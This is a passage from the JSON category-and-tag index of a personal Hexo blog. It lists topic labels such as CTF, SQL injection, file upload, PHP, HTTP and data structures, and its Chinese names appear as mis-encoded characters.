%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"},{"name":"å½±è§†æœ‰æ„Ÿ","slug":"å½±è§†æœ‰æ„Ÿ","permalink":"https://xizhi-future.github.io/categories/%E5%BD%B1%E8%A7%86%E6%9C%89%E6%84%9F/"},{"name":"Webæ¼æ´åŸºç¡€ç¯‡","slug":"Webæ¼æ´åŸºç¡€ç¯‡","permalink":"https://xizhi-future.github.io/categories/Web%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E7%AF%87/"},{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/categories/CTF/"},{"name":"PHP","slug":"PHP","permalink":"https://xizhi-future.github.io/categories/PHP/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://xizhi-future.github.io/categories/BUUCTF/"},{"name":"åšå®¢éƒ¨ç½²","slug":"åšå®¢éƒ¨ç½²","permalink":"https://xizhi-future.github.io/categories/%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2/"},{"name":"WebåŸºç¡€ç¯‡","slug":"WebåŸºç¡€ç¯‡","permalink":"https://xizhi-future.github.io/categories/Web%E5%9F%BA%E7%A1%80%E7%AF%87/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"},{"name":"è™šæ‹Ÿæœº","slug":"è™šæ‹Ÿæœº","permalink":"https://xizhi-future.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"},{"name":"è®¡ç½‘","slug":"è®¡ç½‘","permalink":"https://xizhi-future.github.io/tags/%E8%AE%A1%E7%BD%91/"},{"name":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–","slug":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–","permalink":"https://xizhi-future.github.io/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"æ¼æ´","slug":"æ¼æ´","permalink":"https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://xizhi-future.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"é“¾å¼å­˜å‚¨","slug":"é“¾å¼å­˜å‚¨","permalink":"https://xizhi-future.github.io/tags/%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8/"},{"name":"é¡ºåºè¡¨","slug":"é¡ºåºè¡¨","permalink":"https://xizhi-future.github.io/tags/%E9%A1%BA%E5%BA%8F%E8%A1%A8/"},{"name":"çº¿æ€§å­˜å‚¨","slug":"çº¿æ€§å­˜å‚¨","permalink":"https://xizhi-future.github.io/tags/%E7%BA%BF%E6%80%A7%E5%AD%98%E5%82%A8/"},{"name":"ä¿¡æ¯æœé›†","slug":"ä¿¡æ¯æœé›†","permalink":"https://xizhi-future.github.io/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"},{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"https://xizhi-future.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"https://xizhi-future.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"PHP","slug":"PHP","permalink":"https://xizhi-future.github.io/tags/PHP/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://xizhi-future.github.io/tags/BUUCTF/"},{"name":"åšå®¢","slug":"åšå®¢","permalink":"https://xizhi-future.github.io/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"Hexo","slug":"Hexo","permalink":"https://xizhi-future.github.io/tags/Hexo/"},{"name":"å›¾åºŠ","slug":"å›¾åºŠ","permalink":"https://xizhi-future.github.io/tags/%E5%9B%BE%E5%BA%8A/"},{"name":"Webåº”ç”¨åŸºæœ¬æ¶æ„","slug":"Webåº”ç”¨åŸºæœ¬æ¶æ„","permalink":"https://xizhi-future.github.io/tags/Web%E5%BA%94%E7%94%A8%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84/"},{"name":"HTTP","slug":"HTTP","permalink":"https://xizhi-future.github.io/tags/HTTP/"},{"name":"ä¼šè¯æŠ€æœ¯","slug":"ä¼šè¯æŠ€æœ¯","permalink":"https://xizhi-future.github.io/tags/%E4%BC%9A%E8%AF%9D%E6%8A%80%E6%9C%AF/"}]}